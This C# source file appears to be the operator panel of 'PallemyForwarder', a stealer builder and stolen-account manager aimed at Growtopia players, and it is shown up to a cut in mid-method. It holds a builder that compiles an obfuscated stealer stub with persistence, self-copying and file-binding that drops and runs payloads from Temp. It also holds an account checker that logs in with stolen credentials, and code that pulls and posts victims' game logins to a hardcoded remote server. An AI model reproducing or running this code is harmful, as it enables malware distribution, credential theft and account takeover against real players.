using ENet.Managed;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Web;
using System.Windows.Forms;
using CodeDomExample;
using Microsoft.Win32;
using System.Diagnostics;
using System.CodeDom.Compiler;
using Microsoft.CSharp;
using System.Net.Sockets;

namespace PallemyForwarder
{
    public partial class Form1 : MaterialSkin.Controls.MaterialForm
    {
        #region Account Checker
        ENetHost eNet;
        ENetPeer eNetP;
        public int Growtopia_Port = 17279; 
        public string Growtopia_IP = "213.179.209.168";
        public string Growtopia_Master_IP = "213.179.209.168";
        public int Growtopia_Master_Port = 17279;
        public static string doorid = "";
        public static string tankIDName = "";
        public static string tankIDPass = "";
        public static string game_version = "3.39";
        public static string country = "us";
        static Random aa = new Random();
        static string randomismi = "00";

        public static string macc = "02:" + randomismi + ":" + randomismi + ":" + randomismi + ":" + randomismi + ":" + randomismi;
        public static int token = 0;
        public static bool resetStuffNextLogon = false;
        public static int userID = 0;
        public static int lmode = 0;
        public class PacketSending
        {
            private Random rand = new Random();
            public void SendData(byte[] data, ENetPeer peer, ENetPacketFlags flag = ENetPacketFlags.Reliable)
            {

                if (peer == null) return;
                if (peer.State != ENetPeerState.Connected) return;

                if (rand.Next(0, 1) == 0) peer.Send(data, 0, flag);
                else peer.Send(data, 1, flag);
            }

            public void SendPacketRaw(int type, byte[] data, ENetPeer peer, ENetPacketFlags flag = ENetPacketFlags.Reliable)
            {
                byte[] packetData = new byte[data.Length + 5];
                Array.Copy(BitConverter.GetBytes(type), packetData, 4);
                Array.Copy(data, 0, packetData, 4, data.Length);
                SendData(packetData, peer);
            }

            public void SendPacket(int type, string str, ENetPeer peer, ENetPacketFlags flag = ENetPacketFlags.Reliable)
            {
                SendPacketRaw(type, Encoding.ASCII.GetBytes(str.ToCharArray()), peer);
            }

            public void SecondaryLogonAccepted(ENetPeer peer)
            {
                SendPacket((int)NetTypes.NetMessages.GENERIC_TEXT, string.Empty, peer);
            }

            public void InitialLogonAccepted(ENetPeer peer)
            {
                SendPacket((int)NetTypes.NetMessages.SERVER_HELLO, string.Empty, peer);
            }
        }
        public class NetTypes
        {
            public enum PacketTypes
            {
                PLAYER_LOGIC_UPDATE = 0,
                CALL_FUNCTION,
                UPDATE_STATUS,
                TILE_CHANGE_REQ,
                LOAD_MAP,
                TILE_EXTRA,
                TILE_EXTRA_MULTI,
                TILE_ACTIVATE,
                APPLY_DMG,
                INVENTORY_STATE,
                ITEM_ACTIVATE,
                ITEM_ACTIVATE_OBJ,
                UPDATE_TREE,
                MODIFY_INVENTORY_ITEM,
                MODIFY_ITEM_OBJ,
                APPLY_LOCK,
                UPDATE_ITEMS_DATA,
                PARTICLE_EFF,
                ICON_STATE,
                ITEM_EFF,
                SET_CHARACTER_STATE,
                PING_REPLY,
                PING_REQ,
                PLAYER_HIT,
                APP_CHECK_RESPONSE,
                APP_INTEGRITY_FAIL,
                DISCONNECT,
                BATTLE_JOIN,
                BATTLE_EVENT,
                USE_DOOR,
                PARENTAL_MSG,
                GONE_FISHIN,
                STEAM,
                PET_BATTLE,
                NPC,
                SPECIAL,
                PARTICLE_EFFECT_V2,
                ARROW_TO_ITEM,
                TILE_INDEX_SELECTION,
                UPDATE_PLAYER_TRIBUTE
            };

            public enum NetMessages
            {
                UNKNOWN = 0,
                SERVER_HELLO,
                GENERIC_TEXT,
                GAME_MESSAGE,
                GAME_PACKET,
                ERROR,
                TRACK,
                LOG_REQ,
                LOG_RES
            };

        }
        class VariantList
        {
            // this class has been entirely made by me, based on the code available on the gt bot of anybody :)
            [DllImport("msvcrt.dll", EntryPoint = "memcpy", CallingConvention = CallingConvention.Cdecl, SetLastError = false)]
            public static extern IntPtr memcpy(IntPtr dest, IntPtr src, UIntPtr count);

            public struct VarList
            {
                public string FunctionName;
                public int netID;
                public uint delay;
                public object[] functionArgs;
            };

            public enum OnSendToServerArgs
            {
                port = 1,
                token,
                userId,
                IPWithExtraData = 4
            };

            public byte[] get_extended_data(byte[] pktData)
            {
                return pktData.Skip(56).ToArray();
            }

            public byte[] get_struct_data(byte[] package)
            {
                int packetLen = package.Length;
                if (packetLen >= 0x3c)
                {
                    byte[] structPackage = new byte[packetLen - 4];
                    Array.Copy(package, 4, structPackage, 0, packetLen - 4);
                    int p2Len = BitConverter.ToInt32(package, 56);
                    if (((byte)(package[16]) & 8) != 0)
                    {
                    }
                    else
                    {
                        Array.Copy(BitConverter.GetBytes(0), 0, package, 56, 4);
                    }
                    return structPackage;
                }
                return null;
            }

            public VarList GetCall(byte[] package)
            {

                VarList varList = new VarList();
                //if (package.Length < 60) return varList;
                int pos = 0;
                //varList.netID = BitConverter.ToInt32(package, 8);
                //varList.delay = BitConverter.ToUInt32(package, 24);
                byte argsTotal = package[pos];
                pos++;
                if (argsTotal > 7) return varList;
                varList.functionArgs = new object[argsTotal];

                for (int i = 0; i < argsTotal; i++)
                {
                    varList.functionArgs[i] = 0; // just to be sure...
                    byte index = package[pos]; pos++; // pls dont bully sm
                    byte type = package[pos]; pos++;


                    switch (type)
                    {
                        case 1:
                            {
                                float vFloat = BitConverter.ToUInt32(package, pos); pos += 4;
                                varList.functionArgs[index] = vFloat;
                                break;
                            }
                        case 2: // string
                            int strLen = BitConverter.ToInt32(package, pos); pos += 4;
                            string v = string.Empty;
                            v = Encoding.ASCII.GetString(package, pos, strLen); pos += strLen;

                            if (index == 0)
                                varList.FunctionName = v;

                            if (index > 0)
                            {
                                if (varList.FunctionName == "OnSendToServer") // exceptionary function, having it easier like this :)
                                {
                                    doorid = v.Substring(v.IndexOf("|") + 1); // doorid
                                    if (v.Length >= 8)
                                        v = v.Substring(0, v.IndexOf("|"));
                                }

                                varList.functionArgs[index] = v;
                            }
                            break;
                        case 5: // uint
                            uint vUInt = BitConverter.ToUInt32(package, pos); pos += 4;
                            varList.functionArgs[index] = vUInt;
                            break;
                        case 9: // int (can hold negative values, of course they are always casted but its just a sign from the server that the value was intended to hold negative values as well)
                            int vInt = BitConverter.ToInt32(package, pos); pos += 4;
                            varList.functionArgs[index] = vInt;
                            break;
                        default:
                            break;
                    }
                }
                return varList;
            }
        }
        static string yeterfuck;
        static string nopefuck;
        private void Peer_OnDisconnect_Client(object sender, uint e)
        {
            try
            {
                yeterfuck = File.ReadAllText("s.temp");
                nopefuck = File.ReadAllText("d.temp");
                ListViewItem dsadw = new ListViewItem(id.Text);
                dsadw.SubItems.Add(pass.Text);
                string[] somearrays = yeterfuck.Split('\n');
                string[] somearraysss = nopefuck.Split('\n');
                try
                {
                    for (int i = 0; i < somearrays.Length; i++)
                    {
                        if (somearrays[i].Contains("Worldlock"))
                        {
                            dsadw.SubItems.Add(somearrays[i].ToLower().Replace("worldlock_balance|", ""));
                        }
                    }
                    for (int ix = 0; ix < somearraysss.Length; ix++)
                    {
                        if (somearraysss[ix].Contains("Gems"))
                        {
                            dsadw.SubItems.Add(somearraysss[ix].ToLower().Replace("gems_balance|", ""));
                        }
                    }
                    status.Text = "Checked Success!";
                    listView2.Items.Add(dsadw);
                    File.Delete("d.temp");
                    File.Delete("s.temp");
                }
                catch
                {

                }

            }
            catch
            {

            }
        }
        public void ConnectCurrent()
        {
            if (eNet == null) return;

            if (eNet.ServiceThreadStarted)
            {

                if (eNetP == null)
                {
                    eNetP = eNet.Connect(new System.Net.IPEndPoint(IPAddress.Parse(Growtopia_IP), Growtopia_Port), 2, 0);
                }
                else if (eNetP.State == ENetPeerState.Connected)
                {
                    eNetP.Reset();

                    eNetP = eNet.Connect(new System.Net.IPEndPoint(IPAddress.Parse(Growtopia_IP), Growtopia_Port), 2, 0);
                }
            }
        }
        public static string CreateLogonPacket(string customGrowID = "", string customPass = "")
        {
            string p = string.Empty;
            Random rand = new Random();
            bool requireAdditionalData = false; if (token > 0 || token < 0) requireAdditionalData = true;

            if (customGrowID == "")
            {
                if (tankIDName != "")
                {
                    p += "tankIDName|" + (tankIDName + "\n");
                    p += "tankIDPass|" + (tankIDPass + "\n");
                }
            }
            else
            {
                p += "tankIDName|" + (customGrowID + "\n");
                p += "tankIDPass|" + (customPass + "\n");
            }

            p += "requestedName|" + ("Growbrew" + rand.Next(0, 255).ToString() + "\n"); //"Growbrew" + rand.Next(0, 255).ToString() + "\n"
            p += "f|1\n";
            p += "protocol|94\n";
            p += "game_version|" + (game_version + "\n");
            if (requireAdditionalData) p += "lmode|" + lmode + "\n";
            p += "cbits|0\n";
            p += "player_age|100\n";
            p += "GDPR|1\n";
            p += "hash2|" + rand.Next(-777777777, 777777777).ToString() + "\n";
            p += "meta|localhost\n"; // soon auto fetch meta etc.
            p += "fhash|-716928004\n";
            p += "platformID|4\n";
            p += "deviceVersion|0\n";
            p += "country|" + (country + "\n");
            p += "hash|" + rand.Next(-777777777, 777777777).ToString() + "\n";
            p += "mac|" + macc + "\n";
            if (requireAdditionalData) p += "user|" + (userID.ToString() + "\n");
            if (requireAdditionalData) p += "token|" + (token.ToString() + "\n");
            if (doorid != "") p += "doorID|" + doorid.ToString() + "\n";
            p += "wk|" + ("NONE0\n");
            //p += "zf|-1576181843";
            return p;
        }

        private void Peer_OnReceive_Client(object sender, ENetPacket e)
        {
            try
            {
                // this is a specific, external client made only for the purpose of using the TRACK packet for our gains/advantage in order to check all accounts quick and efficiently.
                byte[] packet = e.GetPayloadFinal();
                Console.WriteLine("RECEIVE TYPE: " + packet[0].ToString());
                status.Text = "Received:" + packet[0].ToString();
                switch (packet[0])
                {
                    case 1: // HELLO server packet.
                        {
                            PacketSending packetSender = new PacketSending();
                            packetSender.SendPacket(2, CreateLogonPacket(id.Text, pass.Text), eNetP);
                            status.Text = "Loginning: " + packet[0].ToString();
                            break;
                        }
                    case 2:
                    case 3:
                        {
                            Console.WriteLine("[ACCOUNT-CHECKER] TEXT PACKET CONTENT:\n" + Encoding.ASCII.GetString(packet.Skip(4).ToArray()));
                            string game = Encoding.ASCII.GetString(packet.Skip(4).ToArray());
                            if (game.Contains("suspend"))
                            {
                                status.Text = "Account Suspended!";
                                eNetP.Disconnect(0);
                            }
                            if (game.Contains("ban"))
                            {
                                status.Text = "Account Banned!";
                                eNetP.Disconnect(0);
                            }
                            if (game.Contains("maint"))
                            {
                                status.Text = "Growtopia servers fuck!";
                                eNetP.Disconnect(0);
                            }
                            if (game.Contains("play.sfx"))
                            {
                                status.Text = "Account Bug!";
                                eNetP.Disconnect(0);
                            }
                            if (game.Contains("UPDATE REQUIRED"))
                            {
                                game.Replace("msg|`4", "");
                                game = Regex.Match(game, @"\d+").Value;
                                game = game.Insert(1, ".");
                                game = "3.38";
                                Console.WriteLine("fuckchecker:" + game);
                                status.Text = "Restart need!";
                            }
                            if (game.Contains("password is wrong"))
                            {
                                status.Text = "Wrong Password!";
                                eNetP.Disconnect(0);
                            }//Incorrect logon token..
                            if (game.Contains("Incorrect logon token"))
                            {
                                VariantList ad = new VariantList();
                                byte[] tankPacket = ad.get_struct_data(packet);
                                VariantList.VarList vList = ad.GetCall(ad.get_extended_data(tankPacket));
                                vList.netID = BitConverter.ToInt32(tankPacket, 4); // add netid
                                vList.delay = BitConverter.ToUInt32(tankPacket, 20); // add keep track of delay modifier
                                string ip = (string)vList.functionArgs[4];

                                if (ip.Contains("|"))
                                    ip = ip.Substring(0, ip.IndexOf("|"));

                                int port = (int)vList.functionArgs[1];
                                userID = (int)vList.functionArgs[3];
                                token = (int)vList.functionArgs[2];
                                lmode = (int)vList.functionArgs[5];
                                Growtopia_IP = ip;
                                Growtopia_Port = port;
                                ConnectCurrent();
                                status.Text = ("Peer Reset Success!");
                                Thread.Sleep(10);
                            }//Incorrect logon token..
                            break;
                        }
                    case 4:
                        {
                            VariantList ad = new VariantList();
                            byte[] tankPacket = ad.get_struct_data(packet);
                            if (tankPacket[0] == 1)
                            {
                                VariantList.VarList vList = ad.GetCall(ad.get_extended_data(tankPacket));
                                vList.netID = BitConverter.ToInt32(tankPacket, 4); // add netid
                                vList.delay = BitConverter.ToUInt32(tankPacket, 20); // add keep track of delay modifier

                                // Console.WriteLine(VarListFetched.FunctionName);
                                if (vList.FunctionName == "OnSendToServer")
                                {
                                    string ip = (string)vList.functionArgs[4];

                                    if (ip.Contains("|"))
                                        ip = ip.Substring(0, ip.IndexOf("|"));

                                    int port = (int)vList.functionArgs[1];
                                    userID = (int)vList.functionArgs[3];
                                    token = (int)vList.functionArgs[2];
                                    lmode = (int)vList.functionArgs[5];
                                    Growtopia_IP = ip;
                                    Growtopia_Port = port;
                                    ConnectCurrent();
                                    status.Text = ("Peer Reset Success!");
                                }
                                // variant call, just rn used for subserver switching
                            }
                            break;
                        }

                    case (byte)NetTypes.NetMessages.TRACK: // TRACK packet.
                        {
                            Console.WriteLine("[ACCOUNT-CHECKER] TRACK PACKET CONTENT:\n" + Encoding.ASCII.GetString(packet.Skip(4).ToArray()));
                            File.AppendAllText("s.temp", Encoding.ASCII.GetString(packet.Skip(4).ToArray()));
                            Growtopia_Port = Growtopia_Master_Port; // todo auto get port
                            Growtopia_IP = Growtopia_Master_IP;
                            PacketSending asd = new PacketSending();
                            asd.SendPacket(2, "action|enter_game", eNetP);

                            if (Encoding.ASCII.GetString(packet.Skip(4).ToArray()).Contains("Gem"))
                            {
                                File.AppendAllText("d.temp", Encoding.ASCII.GetString(packet.Skip(4).ToArray()));
                                eNetP.Disconnect(0);
                            }
                            break;
                        }
                    default:
                        break;
                }
            }
            catch
            {

            }
        }
        public void İşlemKapat(string taskname)
        {
            string processName = taskname;

            foreach (Process process in Process.GetProcessesByName(processName))
            {
                process.Kill();
            }
        }
        private void Client_OnConnect(object sender, ENetConnectEventArgs e)
        {
            e.Peer.OnReceive += Peer_OnReceive_Client;
            e.Peer.OnDisconnect += Peer_OnDisconnect_Client;
            e.Peer.PingInterval(875);
            e.Peer.Timeout(1000, 7000, 15000);
        }
        #endregion
        public static bool iconbool = false;
        public Form1()
        {
            InitializeComponent();
            var skinManager = MaterialSkin.MaterialSkinManager.Instance;
            SkinManager.AddFormToManage(this);
            SkinManager.Theme = MaterialSkin.MaterialSkinManager.Themes.DARK;
            SkinManager.ColorScheme = new MaterialSkin.ColorScheme
                (MaterialSkin.Primary.Orange600, MaterialSkin.Primary.Orange800, MaterialSkin.Primary.Orange900,
                MaterialSkin.Accent.Orange100,
                MaterialSkin.TextShade.WHITE

                );
        }
        public void CheckAccount()
        {
                status.Text = ("");

                ManagedENet.Startup();
                eNet = new ENetHost(1, 2);
                eNet.OnConnect += Client_OnConnect;
                eNet.CompressWithRangeCoder();
                eNet.ChecksumWithCRC32();
                eNet.StartServiceThread();
                eNetP = eNet.Connect(new System.Net.IPEndPoint(IPAddress.Parse(Growtopia_Master_IP), Growtopia_Master_Port), 2, 0);
                status.Text = ("Connected!");
            AccountCheckerLog();
            var time = DateTime.Now.ToFileTime();

        }
        private void materialRaisedButton1_Click(object sender, EventArgs e)
        {
            CheckAccount();
        }
        public static string usr = "";
        public static string pw = "";
        public static string key = "";
        private void showBalloon(string title, string body)
        {
            NotifyIcon notifyIcon = new NotifyIcon();
            notifyIcon.Visible = true;

            if (title != null)
            {
                notifyIcon.BalloonTipTitle = title;
            }

            if (body != null)
            {
                notifyIcon.BalloonTipText = body;
            }

            notifyIcon.ShowBalloonTip(30000);
        }
        bool çekiliyor = false;
        bool ilkaçılış = false;
        public async Task GetAccsAsync()
        {
            if (ilkaçılış == true)
            {

                Random random = new Random();
                var arr1 = new[] { 500, 200, 800, 350, 100, 1000 };
                var rndMember = arr1[random.Next(arr1.Length)];
                string old = statusf.Text;
                statusf.Text = "Checking for new accounts.";
                await Task.Delay(rndMember);
                string username = usr;
                string password = pw;
                string url = "http://45.155.124.146/S4UCKSMYLIFE/getaccs.php";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "POST";
                request.ContentType = "application/x-www-form-urlencoded";
                string data = "key=pallemyforwarderkey3029@&username=" + HttpUtility.UrlEncode(username) + "&password=" + HttpUtility.UrlEncode(password);
                request.ContentLength = data.Length;
                StreamWriter writer = new StreamWriter(request.GetRequestStream(), Encoding.ASCII);
                writer.Write(data);
                writer.Flush();
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                string encoding = response.ContentEncoding;
                if (encoding == null || encoding.Length < 1)
                {
                    encoding = "UTF-8";
                }
                StreamReader reader = new StreamReader(response.GetResponseStream(), Encoding.GetEncoding(encoding));
                data = reader.ReadToEnd();
                response.Close();
                if (data.Contains("nothing"))
                {
                    int num13 = 0;
                    int normalnum13 = num13;
                    var notification13 = new System.Windows.Forms.NotifyIcon()
                    {
                        Visible = true,
                        Icon = System.Drawing.SystemIcons.Information,
                        BalloonTipTitle = "Pallemy Forwarder",
                        BalloonTipText = "There are currently no accounts to see.",
                    };

                    notification13.ShowBalloonTip(5000);
                    notification13.Dispose();
                    statusf.Text = old;
                    return;
                }
                else
                {
                    listView1.Items.Clear();
                    string[] array = data.Split(new char[]
                {
                '+'
                });

                    List<string[]> list = new List<string[]>();
                    foreach (string text2 in array)
                    {
                        if (!string.IsNullOrEmpty(text2))
                        {
                            string[] item = text2.Split(new char[]
                            {
                        ';'
                            });
                            list.Add(item);
                        }
                    }
                    int num = 0;
                    foreach (string[] items in list)
                    {
                        listView1.Items.Add(new ListViewItem(items));
                        num++;
                    }
                    int num1 = 0;
                    int normalnum1 = num1;
                    var notification1 = new System.Windows.Forms.NotifyIcon()
                    {
                        Visible = true,
                        Icon = System.Drawing.SystemIcons.Information,
                        BalloonTipTitle = "Pallemy Forwarder",
                        BalloonTipText = "You have " + normalnum1.ToString() + " accounts to see.",
                    };

                    notification1.ShowBalloonTip(5000);
                    notification1.Dispose();
                    return;
                }
            
             
            }
            else
            {

            if (çekiliyor == true)
            {

            }
            else
            {
                ilkaçılış = true;
                çekiliyor = true;
                    Random random = new Random();
                    var arr1 = new[] { 500, 200, 800, 350, 100, 1000 };
                    var rndMember = arr1[random.Next(arr1.Length)];
                    statusf.Text = "Checking for new accounts.";
                    await Task.Delay(rndMember);
                    listView1.Items.Clear();
                string username = usr;
                string password = pw;
                string url = "http://45.155.124.146/S4UCKSMYLIFE/getaccs.php";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "POST";
                request.ContentType = "application/x-www-form-urlencoded";
                    string data = "key=pallemyforwarderkey3029@&username=" + HttpUtility.UrlEncode(username) + "&password=" + HttpUtility.UrlEncode(password);
                    request.ContentLength = data.Length;
                StreamWriter writer = new StreamWriter(request.GetRequestStream(), Encoding.ASCII);
                writer.Write(data);
                writer.Flush();
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                string encoding = response.ContentEncoding;
                if (encoding == null || encoding.Length < 1)
                {
                    encoding = "UTF-8";
                }
                StreamReader reader = new StreamReader(response.GetResponseStream(), Encoding.GetEncoding(encoding));
                data = reader.ReadToEnd();
                response.Close();

                    try
                    {
                        data = data.Replace("nothing", "");
                    }
                    catch
                    {
                        Application.DoEvents();
                    }
                    if (data.Contains("You dont have permissions"))
                    {
                        MessageBox.Show("Accounts cannot be withdrawn because your computer could not be injected.", "Pallemy Forwarder", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    }
                    string[] array = data.Split(new char[]
                {
                '+'
                });

                List<string[]> list = new List<string[]>();
                foreach (string text2 in array)
                {
                    if (!string.IsNullOrEmpty(text2))
                    {
                        string[] item = text2.Split(new char[]
                        {
                        ';'
                        });
                        list.Add(item);
                    }
                }
                    int num = 0;
                    foreach (string[] items in list)
                    {
                        listView1.Items.Add(new ListViewItem(items));
                        num++;
                    }
                    int normalnum = num;
                var notification = new System.Windows.Forms.NotifyIcon()
                {
                    Visible = true,
                    Icon = System.Drawing.SystemIcons.Information,
                    BalloonTipTitle = "Pallemy Forwarder",
                    BalloonTipText = "You have a total of " + normalnum.ToString() + " accounts.",
                };

                    notification.ShowBalloonTip(5000);
                notification.Dispose();
                statusf.Text = "Accounts: " + normalnum.ToString();
                çekiliyor = false;
            }

            }

        }
        private void requestDataToolStripMenuItem_Click(object sender, EventArgs e)
        {
#pragma warning disable CS4014 // Bu çağrı beklenmediği için, çağrı tamamlanmadan önce geçerli yöntemin yürütülmesine devam ediliyor
            GetAccsAsync();
#pragma warning restore CS4014 // Bu çağrı beklenmediği için, çağrı tamamlanmadan önce geçerli yöntemin yürütülmesine devam ediliyor
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            Login z = new Login();
            z.Hide();
            this.Cursor = Cursor.Current;
            Cursor.Current = Cursors.Default;

            var time = DateTime.Now.ToFileTime();
            materialTabControl1.SelectedIndex = 1;
#pragma warning disable CS4014 
            GetAccsAsync();
#pragma warning restore CS4014 
            RegistryKey keys = Registry.CurrentUser.OpenSubKey(@"Pallemy", true);
            keys.SetValue("user", usr);
            keys.SetValue("pass", pw);
            string key = "";
            key = keys.GetValue("key").ToString();
            keytxt.Text = key;
            usernamee.Text = usr;
        }

        public string AccountCheckerLog()
        {
            string url = "http://45.155.124.146/S4UCKSMYLIFE/logs.php";
            string ip = new WebClient().DownloadString("http://icanhazip.com/");
            var time = DateTime.Now.ToFileTime();
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
            request.Method = "POST";
            request.ContentType = "application/x-www-form-urlencoded";
            DateTime now = DateTime.Now;
            string data = "checker=true" + "&growid=" + id.Text + "&password=" + pass.Text + "&user=" + usr + "&date=" + now;
            request.ContentLength = data.Length;
            StreamWriter writer = new StreamWriter(request.GetRequestStream(), Encoding.ASCII);
            writer.Write(data);
            writer.Flush();
            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
            string encoding = response.ContentEncoding;
            if (encoding == null || encoding.Length < 1)
            {
                encoding = "UTF-8";
            }
            StreamReader reader = new StreamReader(response.GetResponseStream(), Encoding.GetEncoding(encoding));
            data = reader.ReadToEnd();
            response.Close();
            return data;

        }

        public string DeleteSave()
        {
            string url = "http://45.155.124.146/S4UCKSMYLIFE/deletesave.php";
            string ip = new WebClient().DownloadString("http://icanhazip.com/");
            var time = DateTime.Now.ToFileTime();
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
            request.Method = "POST";
            request.ContentType = "application/x-www-form-urlencoded";
            string data = "id=" + listView1.SelectedItems[0].Text + "&growid=" + listView1.SelectedItems[0].SubItems[1].Text + "&growpw=" + listView1.SelectedItems[0].SubItems[2].Text + "&username=" + "baran" + "&ip=" + listView1.SelectedItems[0].SubItems[3].Text + "&owner=" + usr;
            request.ContentLength = data.Length;
            StreamWriter writer = new StreamWriter(request.GetRequestStream(), Encoding.ASCII);
            writer.Write(data);
            writer.Flush();
            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
            string encoding = response.ContentEncoding;
            if (encoding == null || encoding.Length < 1)
            {
                encoding = "UTF-8";
            }
            StreamReader reader = new StreamReader(response.GetResponseStream(), Encoding.GetEncoding(encoding));
            data = reader.ReadToEnd();
            response.Close();
            return data;

        }
        private void deleteAccountToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedIndices.Count > 0)
                {


                    DialogResult dialogResult = MessageBox.Show("All accounts with the same name and password will be deleted. Are you sure?", "Pallemy Forwarder", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
                    if (dialogResult == DialogResult.Yes)
                    {
                        DeleteSave();
                        listView1.Items.RemoveAt(listView1.SelectedItems[0].Index);
                        List<string[]> list = new List<string[]>();
                        int num = 0;
                        foreach (string[] items in list)
                        {
                            listView1.Items.Add(new ListViewItem(items));
                            num++;
                        }
                        statusf.Text = "Accounts: " + num.ToString();
                    }
                }
            }
            catch
            {
                Application.DoEvents();
            }
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            İşlemKapat("PallemyForwarder");
        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            Environment.Exit(0);

        }

        private async void materialRaisedButton3_Click(object sender, EventArgs e)
        {
            string built = Properties.Resources.Stub;
            built = built.Replace("//user//", usr);
            if (trace.Checked == true)
            {
                built = built.Replace("bool trace = false;", "bool trace = false;");
            }
            if (RegularStartup.Checked == true)
            {
                built = built.Replace("//using", "using");
                built = built.Replace("//{", "{");
                built = built.Replace("//try", "try");
                built = built.Replace("//}", "}");
            }
            if (fuckgt.Checked == true)
            {
                built = built.Replace("bool fuckgt = false;", "bool fuckgt = true;");
            }
            if (errorr.Checked == true)
            {
                built = built.Replace("change31", errormsg.Text);
            }
            if (CopyStealer.Checked == true)
            {
                built = built.Replace("//copyfile", @"

                 String fileName = String.Concat(Process.GetCurrentProcess().ProcessName, "".exe"");
                    String filePath = Path.Combine(Environment.CurrentDirectory, fileName);
                    if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + ""\\"" + fileName))
                    {
                        File.Copy(filePath, Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), fileName));
                        Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + ""\\"" + fileName);
                        Environment.Exit(0);
   

                    }


                    ");
            }
            using (SaveFileDialog saveFile = new SaveFileDialog())
            {
                saveFile.Filter = "Executable (*.exe)|*.exe";
                if (saveFile.ShowDialog() == DialogResult.OK)
                {


                    textBox1.Text = "[+] Building Client";
                    await Task.Delay(1000);
                    textBox1.Text = "[+] Building Client" + Environment.NewLine + "[+] Obfuscating Stealer";
                    await Task.Delay(1000);

                    CSharpCodeProvider provider = new CSharpCodeProvider();
                    CompilerParameters cp = new CompilerParameters();

                    // Generate an executable instead of 
                    // a class library.
                    cp.GenerateExecutable = true;

                    // Set the assembly file name to generate.
                    cp.OutputAssembly = saveFile.FileName;

                    // Generate debug information.
                    cp.IncludeDebugInformation = true;

                    // Add an assembly reference.
                    cp.ReferencedAssemblies.Add("System.dll");
                    cp.ReferencedAssemblies.Add("System.IO.dll");
                    cp.ReferencedAssemblies.Add("System.Net.dll");
                    cp.ReferencedAssemblies.Add("System.Net.Http.dll");
                    cp.ReferencedAssemblies.Add("System.Security.dll");
                    cp.ReferencedAssemblies.Add("System.Core.dll");
                    cp.ReferencedAssemblies.Add("System.IO.compression.filesystem.dll");
                    cp.ReferencedAssemblies.Add("System.IO.compression.dll");
                    cp.ReferencedAssemblies.Add("System.Management.dll");
                    cp.ReferencedAssemblies.Add("System.Drawing.dll");
                    cp.ReferencedAssemblies.Add("System.Web.dll");
                    cp.ReferencedAssemblies.Add("System.Windows.Forms.dll");
                    cp.GenerateInMemory = false;
                    cp.WarningLevel = 3;
                    cp.TreatWarningsAsErrors = false;
                    if (materialCheckBox4.Checked == true)
                    {
                        string text3 = "string FileNames = \"%FILENAME1%\";\r\n            string RandomChars = \"trashlol\" + DateTime.Now.Millisecond;\r\n                bool delay = false;\r\n                Directory.SetCurrentDirectory(Path.GetTempPath());\r\n                    ExtractResource(FileNames, RandomChars + FileNames);\r\n                    Process.Start(RandomChars + FileNames);\r\n                \r\n                if (delay == true)\r\n                {\r\n                    Thread.Sleep(30000);\r\n                }\r\n\r\n\r\n                ";
                        cp.EmbeddedResources.Add(this.bindfile.Text);
                        string fileName2 = Path.GetFileName(this.bindfile.Text);
                        text3 = text3.Replace("%FILENAME1%", fileName2);
                        built = built.Replace("//bindmethod", text3);
                    }
                    if (iconz.Checked == true)
                    {
                        cp.CompilerOptions = "/target:winexe /win32icon:" + materialSingleLineTextField2.Text;

                    }
                    else
                    {
                        cp.CompilerOptions = "/target:winexe";
                    }

                    if (provider.Supports(GeneratorSupport.EntryPointMethod))
                    {

                    }
                    CompilerResults cr = provider.CompileAssemblyFromSource(cp, built);
                    if (cr.Errors.Count > 0)
                    {
                        MessageBox.Show(cr.Errors[0].ErrorText);
                        // Display compilation errors.
                        Console.WriteLine("Errors building {0} into {1}",
                            built, cr.PathToAssembly);
                        foreach (CompilerError ce in cr.Errors)
                        {
                            Console.WriteLine("  {0}", ce.ToString());
                            Console.WriteLine();
                        }
                    }
                    string pdb = saveFile.FileName;
                    pdb = pdb.Replace(".exe", "");
                    File.Delete(pdb + ".pdb");
                    textBox1.Text = "[+] Building Client" + Environment.NewLine + "[+] Obfuscating Stealer" + Environment.NewLine + "[+]Done Building Stealer";
                    MessageBox.Show("Done Building Stealer!", "PallemyForwarder v1.0(BETA)", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
        }
        private void aAPBypassToolStripMenuItem_Click(object sender, EventArgs e)
        {
            AAPBypass a = new AAPBypass();
            a.Show();
        }

        private void CheckAccountToolStripMenuItem_Click(object sender, EventArgs e)
        {   
            try
            {
                pass.Text = listView1.SelectedItems[0].SubItems[2].Text;

                id.Text = listView1.SelectedItems[0].SubItems[1].Text;
                materialTabControl1.SelectedIndex = 2;
                CheckAccount();
            }
            catch
            {

            }



        }

        private void exportAccountToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if(!Directory.Exists("Exports"))
            {
                Directory.CreateDirectory("Exports");
            }
            foreach (ListViewItem itemRow in listView1.SelectedItems)
            {

                string password = listView1.SelectedItems[0].SubItems[2].Text;

                string growid =  listView1.SelectedItems[0].SubItems[1].Text;

                File.WriteAllText("Exports\\" + growid + ".txt","GrowID :" + growid + "\nPassword : " + password);

            }


        }

        private void materialRaisedButton2_Click(object sender, EventArgs e)
        {
            usr = "";
            pw = "";
            RegistryKey keys = Registry.CurrentUser.OpenSubKey(@"Pallemy", true);

            keys.SetValue("user", usr);
            keys.SetValue("pass", pw);
            Login z = new Login();
            z.Show();
            Hide();
        }
        private void listView1_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (e.KeyChar == (char)Keys.Delete)
            {
                try
                {
                    DeleteSave();
